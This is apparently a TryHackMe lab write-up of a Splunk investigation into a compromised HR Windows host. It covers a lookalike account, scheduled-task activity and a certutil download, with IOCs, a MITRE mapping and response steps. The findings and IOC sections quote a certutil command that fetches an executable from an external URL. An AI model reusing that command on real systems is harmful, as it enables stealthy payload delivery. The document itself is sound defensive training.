# Compromised Windows Host Investigation with Splunk

## Executive Summary

A suspected compromise affecting a Windows host within the HR department was investigated using Splunk Enterprise.

Analysis of Windows process-creation logs revealed suspicious scheduled-task activity, an impersonation-style user account, and the abuse of the trusted Windows utility `certutil.exe` to download an executable from an external file-sharing service.

The investigation identified the affected user, execution timestamp, remote URL, downloaded filename, and techniques used to bypass security controls.

---

## Investigation Overview

An intrusion detection alert indicated suspicious process execution on a host belonging to the HR department.

Due to limited data availability, the investigation focused on Windows **Event ID 4688**, which records process-creation activity. The logs were ingested into the Splunk index:

```spl
index=win_eventlogs
```

### Environment

| Item | Details |
|---|---|
| SIEM | Splunk Enterprise 8.2.6 |
| Data source | Windows process-creation logs |
| Primary Event ID | 4688 |
| Index | `win_eventlogs` |
| Investigation type | Compromised endpoint investigation |
| Affected department | Human Resources |

---

## Investigation Objectives

The investigation aimed to:

- Validate the available log data
- Identify suspicious or impersonated accounts
- Review scheduled-task execution
- Determine which HR user downloaded the payload
- Identify the Windows utility used for the download
- Extract the external domain, URL, and downloaded filename
- Map the activity to relevant MITRE ATT&CK techniques

---

# Investigation Workflow

## 1. Validate Log Ingestion

The investigation began by searching the complete Windows event dataset.

### SPL Query

```spl
index=win_eventlogs
```

The search returned **13,959 events** from the available investigation period.

### Evidence

![Initial Windows Event Log Search](images/01-initial-log-search.png)

---

## 2. Identify an Impersonated Account

User activity was summarized to identify unusual or low-frequency usernames.

### SPL Query

```spl
index=win_eventlogs
| stats count by UserName
```

The results revealed two visually similar usernames:

- `Amelia`
- `Amel1a`

The account `Amel1a`, which substitutes the number `1` for the letter `i`, appeared only once. This naming pattern indicated an attempt to impersonate the legitimate user `Amelia`.

### Evidence

![Imposter Account Identification](images/02-imposter-account-identification.png)

---

## 3. Review Scheduled-Task Activity

The investigation also searched for execution of the Windows scheduled-task utility:

```spl
index=win_eventlogs schtasks.exe
```

Analysis associated scheduled-task activity with the HR user:

```text
Chris.fort
```

Scheduled tasks can be legitimate administrative activity, but attackers may also use them for execution or persistence. Therefore, the activity required further review and correlation.

---

## 4. Hunt for External Payload Downloads

The HR usernames were searched for command lines containing HTTP activity.

### SPL Query

```spl
index=win_eventlogs
(UserName="haroon" OR UserName="chris.fort" OR UserName="diana")
CommandLine="*http*"
| table _time, UserName, CommandLine
```

The query returned one suspicious event associated with the user `haroon`.

The command line showed that `certutil.exe` was used to download an executable from an external website:

```cmd
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

### Evidence

![Certutil Payload Download](images/03-certutil-payload-download.png)

---

# Key Findings

| Finding | Result |
|---|---|
| Total logs reviewed | 13,959 |
| Suspicious impersonated account | `Amel1a` |
| Legitimate account being impersonated | `Amelia` |
| User associated with scheduled tasks | `Chris.fort` |
| User who downloaded the payload | `haroon` |
| LOLBin used | `certutil.exe` |
| Execution date | 2022-03-04 |
| External domain | `controlc.com` |
| Downloaded filename | `benign.exe` |
| Full URL | `https://controlc.com/e4d11035` |

---

# Attack Timeline

## 2022-03-04 10:38:28

The user `haroon` executed `certutil.exe` with the `-urlcache` and `-f` options to retrieve content from an external URL and save it locally as `benign.exe`.

The use of a trusted Windows binary for file retrieval is suspicious because it may allow an attacker to blend malicious activity with legitimate system processes.

---

# Indicators of Compromise

## Usernames

```text
Amel1a
haroon
```

## Executable

```text
benign.exe
```

## Living-off-the-Land Binary

```text
certutil.exe
```

## Domain

```text
controlc.com
```

## URL

```text
https://controlc.com/e4d11035
```

## Suspicious Command

```cmd
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

---

# MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Defense Evasion | Masquerading | T1036 | The account `Amel1a` closely resembled the legitimate username `Amelia` |
| Execution / Persistence | Scheduled Task/Job | T1053 | `schtasks.exe` activity was identified in the process-creation logs |
| Defense Evasion | System Binary Proxy Execution: Certutil | T1218.003 | `certutil.exe` was used to retrieve the executable |
| Command and Control | Ingress Tool Transfer | T1105 | A file was downloaded from an external service to the endpoint |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | The payload was retrieved over HTTPS |

---

# SOC Assessment

The evidence indicates that the HR endpoint was likely compromised.

The strongest evidence was the execution of `certutil.exe` by `haroon` to download `benign.exe` from an external file-sharing URL. Although `certutil.exe` is a legitimate Microsoft utility, attackers frequently abuse trusted system binaries to avoid introducing obvious third-party tools.

The presence of a lookalike username and scheduled-task activity further increased the likelihood of malicious post-compromise behavior.

---

# Recommended Response Actions

1. Isolate the affected HR endpoint from the network.

2. Quarantine and analyze `benign.exe` in a controlled malware-analysis environment.

3. Block the identified domain and URL through available DNS, proxy, firewall, and endpoint controls.

4. Review all activity associated with the users `haroon`, `Chris.fort`, `Amelia`, and `Amel1a`.

5. Disable or remove the impersonated account after confirming it is unauthorized.

6. Review scheduled tasks created or modified during the investigation period.

7. Hunt across the environment for additional executions of:

```text
certutil.exe
benign.exe
schtasks.exe
```

8. Create detections for `certutil.exe` command lines containing URL-download arguments such as:

```text
-urlcache
http
https
```

9. Reset credentials for affected accounts if unauthorized access is confirmed.

---

# Skills Demonstrated

- Splunk Search Processing Language
- Windows Event ID 4688 analysis
- Process-creation investigation
- User account anomaly detection
- Living-off-the-Land Binary detection
- Scheduled-task investigation
- IOC extraction
- Threat hunting
- Timeline reconstruction
- MITRE ATT&CK mapping
- Incident response recommendations

---

# Tools Used

- Splunk Enterprise
- Windows Event Logs
- MITRE ATT&CK
- TryHackMe lab environment

---

